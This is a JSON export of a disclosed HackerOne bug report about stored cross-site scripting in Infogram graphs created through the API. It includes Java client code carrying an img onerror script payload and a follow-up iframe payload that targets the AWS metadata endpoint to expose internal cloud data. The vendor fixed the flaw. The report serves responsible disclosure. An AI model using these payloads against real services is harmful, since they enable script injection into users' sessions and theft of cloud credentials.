{
  "id": 287562,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODc1NjI=",
  "url": "https://hackerone.com/reports/287562",
  "title": "Stored XSS in content when Graph is created via API",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-11-05T13:35:29.891Z",
  "submitted_at": "2017-11-05T13:35:29.891Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "krankopwnz",
    "url": "/krankopwnz",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 21745,
    "url": "https://hackerone.com/infogram",
    "handle": "infogram",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Infogram",
      "twitter_handle": "infogram",
      "website": "http://infogram.com",
      "about": "Make Infographics and Charts that People Love"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-11-07T09:32:34.044Z",
  "bug_reporter_agreed_on_going_public_at": "2017-11-06T16:34:39.269Z",
  "team_member_agreed_on_going_public_at": "2017-11-07T09:32:33.954Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#Summary\nIt is possible for an attacker to insert javascript code into Graphs by creating a project via the API\n\n#Steps to reproduce\nLogin\nGo to [API Settings](https://infogram.com/app/#settings/api)\nCopy your Key + Secret\nGo to [API Documentation](https://developers.infogr.am/rest/)\nDownload one of the official libraries ( I chose JAVA )\nIn the \"main\" method add the Key + Secret you copied previously\nAdd a new parameter \"content\" with the following content:\n\n`[{\\\"type\\\":\\\"h1\\\",\\\"text\\\":\\\"asd>\\\\\\\"'<img src=a onerror=alert(document.domain)>\\\"}]`\n\nAdd all the other required parameters\nMy main method looks like this:\n```\npublic static void main(String[] args) {\n        InfogramAPI infogram = new InfogramAPI([API-Key], [API-Secret]);\n\n        Map<String, String> parameters = new HashMap<String, String>();\n\n        //parameters = null;\n\n        parameters.put(\"content\", \"[{\\\"type\\\":\\\"h1\\\",\\\"text\\\":\\\"asd>\\\\\\\"'<img src=a onerror=alert(document.domain)>\\\"}]\");\n        parameters.put(\"theme_id\", \"7291\");\n        parameters.put(\"title\",\"title\");\n        parameters.put(\"publish\", \"true\");\n        parameters.put(\"publish_mode\", \"public\");\n        \n        try {\n            Response response = infogram.sendRequest(\"POST\", \"infographics\", parameters);\n\n            if (response.isSuccessful()) {\n                InputStream is = response.getResponseBody();\n                System.out.print(getStringFromInputStream(is).replace(\",\", \",\\n\"));\n                \n            } else {\n                String errmsg = String.format(\"The server returned %d %s\", response.getHttpStatusCode(), response.getHttpStatusMessage());\n                System.err.println(errmsg);\n            }\n        } catch (IOException e) {\n            System.err.println(\"There was a problem connecting to the server\");\n            e.printStackTrace();\n        }\n    }\n```\n\nYou will get a 201 response which indicates that the Graph has been successfully created\nNow go to your [Dashboard](https://infogram.com/app/#/library)\nOpen the newly created project\nA Javascript popup showing the current domain appears\n\n{F236727}\n\n#Remediation\nHTML encode all parameter values before reflecting them on the page",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 236727,
      "file_name": "storedXSS-api.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/727/304460e190c7d0a7360772dddc224cd148fee7dd/storedXSS-api.PNG?response-content-disposition=attachment%3B%20filename%3D%22storedXSS-api.PNG%22%3B%20filename%2A%3DUTF-8%27%27storedXSS-api.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075745Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=20852713ceb657ca49069ea2de442bd7b9ee0104ae2df52fce2069522b80e9d8",
      "file_size": 29376,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-12-06T16:34:39.366Z",
  "allow_singular_disclosure_after": -182877786.4732971,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "0xsaltyhashes",
    "sp1d3rs",
    "krankopwnz",
    "eveeez",
    "khizer47",
    "ahmet3513",
    "b4155f7c29acd42c27d007a"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 870,
    "asset_type": "URL",
    "asset_identifier": "infogram.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 2135479,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I just discovered that it is also possible to make requests to the internal network ( or at least the AWS instance where the rendering of the preview images is made ).\n\nFor that you have to include an iframe with the src of the AWS Metadata URL, so you have to replace the content parameter from the previous post with the following:\n\n`parameters.put(\"content\", \"[{\\\"type\\\":\\\"h1\\\",\\\"text\\\":\\\"asd>\\\\\\\"'<iframe src=http://169.254.169.254/latest/meta-data/></iframe>\\\"}]\");`\n\nand create a new infographic via the API with that\nWhen you now go to the [Dashboard](https://infogram.com/app/#/library) you see the disclosed data in the preview picture of your project:\n\n{F236730}\n\nI did not test this further as I do not want to touch sensitive data, but this can potentially used to get AWS credentials of the services you are running ( depends on the permissions of the user the request is made with )",
      "automated_response": false,
      "created_at": "2017-11-05T13:49:25.810Z",
      "updated_at": "2017-11-05T13:58:50.317Z",
      "actor": {
        "username": "krankopwnz",
        "cleared": false,
        "verified": false,
        "url": "/krankopwnz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 236730,
          "filename": "AWS.jpg",
          "type": "image/jpeg",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/730/7852f473594235d9ccd09422df168b78dd5aee25/AWS.jpg?response-content-disposition=attachment%3B%20filename%3D%22AWS.jpg%22%3B%20filename%2A%3DUTF-8%27%27AWS.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075745Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=ce6928f6854198458a327dc498c19c4c226d8ba6dbcd5763fcaacd01d1c11645"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "infogram"
    },
    {
      "id": 2136370,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2017-11-06T08:59:13.406Z",
      "updated_at": "2017-11-06T08:59:13.406Z",
      "actor": {
        "username": "kaspars",
        "cleared": false,
        "verified": false,
        "url": "/kaspars",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "infogram"
    },
    {
      "id": 2136642,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thanks, it should be fixed now.\n\nBest regards,\nKaspars",
      "automated_response": false,
      "created_at": "2017-11-06T11:07:05.425Z",
      "updated_at": "2017-11-06T11:07:05.425Z",
      "actor": {
        "username": "kaspars",
        "cleared": false,
        "verified": false,
        "url": "/kaspars",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "krankopwnz",
        "url": "/krankopwnz"
      },
      "genius_execution_id": null,
      "team_handle": "infogram"
    },
    {
      "id": 2137378,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Looks fixed for me, thank you",
      "automated_response": false,
      "created_at": "2017-11-06T16:34:39.310Z",
      "updated_at": "2017-11-06T16:34:39.310Z",
      "first_to_agree": true,
      "actor": {
        "username": "krankopwnz",
        "cleared": false,
        "verified": false,
        "url": "/krankopwnz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "infogram"
    },
    {
      "id": 2139482,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2017-11-07T09:32:33.998Z",
      "updated_at": "2017-11-07T09:32:33.998Z",
      "actor": {
        "username": "kaspars",
        "cleared": false,
        "verified": false,
        "url": "/kaspars",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "infogram"
    },
    {
      "id": 2139483,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2017-11-07T09:32:34.077Z",
      "updated_at": "2017-11-07T09:32:34.077Z",
      "actor": {
        "username": "kaspars",
        "cleared": false,
        "verified": false,
        "url": "/kaspars",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "infogram"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}